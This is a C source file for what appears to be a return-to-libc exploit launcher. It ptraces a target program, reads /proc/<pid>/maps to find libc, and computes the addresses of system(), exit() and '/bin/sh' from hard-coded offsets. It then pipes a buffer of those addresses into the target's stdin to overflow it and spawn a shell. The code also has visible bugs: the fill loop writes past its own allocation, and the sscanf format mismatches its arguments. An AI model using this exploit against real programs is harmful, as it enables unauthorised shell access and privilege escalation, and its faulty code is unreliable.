#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <asm/unistd.h>
#include <sys/reg.h>

static off_t const exitofft = 0x2de10;
static off_t const systemofft = 0x380b0;
static off_t const binshofft = 0x1243ff;

static unsigned long exitvaddr = 0x2de10;
static unsigned long systemvaddr = 0x380b0;
static unsigned long binshvaddr = 0x1243ff;

static void ril_unblock_child(pid_t child)
{
    puts("detaching child\n");
    ptrace(PTRACE_DETACH,   child,  NULL, NULL);
}

static int ril_ptrace(pid_t child)
{
    int     status;
    long    orig_eax;
    long    eax;
    int     insyscall = 0;
    long    params[3];
	while (1) {
		wait(&status);
		if (WIFEXITED(status))
			break;
		orig_eax = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);
		if (orig_eax == __NR_write) {
            printf("first prompt detected, then,"
                   "we're going to infect stdin child process\n");
            ril_unblock_child(child);
            return 1;
		}
		ptrace(PTRACE_SYSCALL, child, NULL, NULL);
	}
    ril_unblock_child(child);
    return 0;
}

static FILE *ril_open_map_file(pid_t pid)
{
	FILE *ret;
	char buff[20];

	snprintf(buff, sizeof(buff), "/proc/%u/maps", pid);
	printf("opening %s file\n", buff);

	ret = fopen(buff, "r");
	if (ret == NULL) {
		perror("fopen :");
		return ret;
	}
	return ret;

}

static void ril_close_map_file(FILE * fp)
{
	if (fp) {
		fclose(fp);
	}
}

static int ril_matchline_map_file(char *const line)
{
	char useless[128], perm[5];
	unsigned long start_vaddr;
	if (strstr(line, "libc-") == NULL) {
		return 0;
	}

	sscanf(line, "%x-%s %s %s %s %s %s",
	       (unsigned long *)&start_vaddr,
	       useless, perm, useless, useless, useless, useless, useless);
	if (perm[2] == 'x') {
		exitvaddr += start_vaddr;
		systemvaddr += start_vaddr;
		binshvaddr += start_vaddr;
	}
	return 1;
}

static int ril_read_map_file(FILE * fp)
{
	char line[512];
	if (!fp) {
		return;
	}
	while (fgets(line, sizeof(line), fp)) {
		if (ril_matchline_map_file(line)) {
			return 1;
		}
	}
	return 0;
}

void ril_make_buffer(char **buffer, pid_t pid, size_t noplen)
{
    size_t allocsize, i;
    size_t nbiter;
    size_t rest = noplen % 3;
    unsigned long *ptr;

    allocsize = (rest + noplen) * sizeof(unsigned long) + 2;
    nbiter = allocsize / 3;
    *buffer = malloc(allocsize);
    ptr = (unsigned long*)(*buffer);
    for( i = 0; i < allocsize; ++i) {
        *ptr = systemvaddr; 
        ptr++;
        *ptr = exitvaddr;
        ptr++;
        *ptr = binshvaddr;
        ptr++;
    }
}

int main(int argc, char *argv[])
{
	FILE *fp;
	pid_t pid;
	size_t bufflen;
	int fdpipe[2];
	char *buffer = NULL;

	if (argc != 3) {
		fprintf(stderr, "usage : %s <appzname> <buffsize>\n", *argv);
		return -1;
	}

	pipe(fdpipe);

	pid = fork();
	if (pid < 0) {
		perror("fork : ");
		return -1;
	}

	if (pid == 0) {
		dup2(fdpipe[0], STDIN_FILENO);
		close(fdpipe[1]);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		execl(argv[1], argv[1], NULL);
	} else {
        int ret = ril_ptrace(pid);
        if(ret == 0) {
            printf("target finished without giving us opportunity to infect stdin\n");
            return 0;
        }
		fp = ril_open_map_file(pid);
		if (ril_read_map_file(fp)) {
			ril_make_buffer(&buffer, pid, atoi(argv[2]));
		}
		//ril_close_map_file(fp);
        printf("continue execution of %s\n", argv[1]);
        ril_unblock_child(pid);
        
		close(fdpipe[0]);
		dup2(fdpipe[1], STDOUT_FILENO);
		puts(buffer);
		wait(NULL);
	}

	return 0;
}
